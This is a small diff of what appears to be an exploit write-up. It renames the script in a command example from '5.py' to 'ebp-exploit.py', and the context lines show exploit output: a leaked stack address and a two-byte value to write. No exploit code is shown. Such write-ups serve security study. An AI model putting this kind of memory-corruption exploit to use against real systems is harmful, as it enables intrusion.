@@ -123,7 +123,7 @@ t.interact()
 running the exploit we have: 
 
 ```
-$ python 5.py 
+$ python ebp-exploit.py 
 [+] Leaked Address:  0xffbea7c8
 [+] 2Byte Significant Byte to write :  0xa7ac
 [+] Here you go
